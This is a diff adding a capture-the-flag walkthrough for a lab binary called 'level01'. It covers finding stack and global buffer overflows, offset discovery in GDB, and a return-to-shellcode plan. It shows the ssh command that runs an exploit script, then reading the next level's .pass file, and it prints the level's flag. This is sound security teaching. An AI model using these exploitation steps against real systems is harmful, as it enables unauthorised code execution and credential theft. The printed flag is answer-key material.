@@ -1,0 +1,101 @@
+# Level01 Walkthrough
+
+## Vulnerabilities
+
+1. **Global buffer overflow**: `a_user_name[100]` can be overflowed with `fgets(a_user_name, 256, stdin)`
+2. **Stack buffer overflow**: `password[64]` can be overflowed with `fgets(password, 100, stdin)`
+
+The second vulnerability is the exploitable one - we can overflow the password buffer by 36 bytes, enough to overwrite the saved return address.
+
+## Analysis Steps
+
+### 1. Export and examine the binary
+
+```bash
+scp -P 4242 level01@192.168.44.139:~/level01 ./binaries/level01
+strings binaries/level01
+```
+
+Found interesting strings:
+- "dat_wil" - hardcoded username
+- "admin" - hardcoded password (but not used for exploitation)
+- "verifying username...."
+
+### 2. Check security protections
+
+```bash
+checksec level01
+```
+
+Results:
+- **No stack canary** ✓
+- **NX disabled** (stack is executable) ✓
+- **No PIE** (fixed addresses) ✓
+
+Perfect conditions for shellcode injection!
+
+### 3. Decompile with Ghidra/IDA
+
+Key findings:
+- `a_user_name` is a global buffer at `0x0804a040` (100 bytes)
+- `password` is a stack buffer at `[esp+0x1c]` (64 bytes)
+- Username must start with "dat_wil" to pass `verify_user_name()`
+- Password buffer can be overflowed with up to 100 bytes
+
+### 4. Find the offset with GDB
+
+```bash
+gdb ./level01
+break *0x08048574  # Before fgets for password
+run
+# Enter "dat_wil" as username
+info frame
+# Saved EIP at 0xffffd70c
+print $esp
+# ESP at 0xffffd6a0
+# Password buffer at esp+0x1c = 0xffffd6bc
+# Offset = 0xffffd70c - 0xffffd6bc = 0x50 = 80 bytes
+```
+
+Confirmed with pattern:
+```
+c
+AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
+# Crashed at 0x55555555 (UUUU at offset 80) ✓
+```
+
+## Exploitation Strategy
+
+1. Put shellcode in the username buffer (global, at fixed address `0x0804a040`)
+2. Username must start with "dat_wil" to pass verification
+3. Overflow password buffer to overwrite return address
+4. Point return address to shellcode in username buffer
+
+### Exploit Code
+
+See `Ressources/exploit.py`:
+- Username: `"dat_wil" + NOP sled (60 bytes) + shellcode (23 bytes)`
+- Password: `padding (80 bytes) + return address (0x0804a040 + 40)`
+
+### Running the Exploit
+
+```bash
+(python3 Ressources/exploit.py; cat) | ssh level01@192.168.44.139 -p 4242 "./level01"
+whoami
+# level02
+cat /home/users/level02/.pass
+```
+
+## Flag
+
+```
+PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
+```
+
+## Key Takeaways
+
+1. **Always validate buffer sizes**: `fgets(buffer, size, stdin)` should never exceed the actual buffer size
+2. **Use stack canaries**: Would have detected the stack corruption
+3. **Enable NX/DEP**: Would prevent shellcode execution
+4. **Global buffers can be exploited**: Even though the overflow is in a global buffer, we can use it to store shellcode and jump to it from a stack overflow
+5. **Defense in depth**: Multiple vulnerabilities combined make exploitation easier
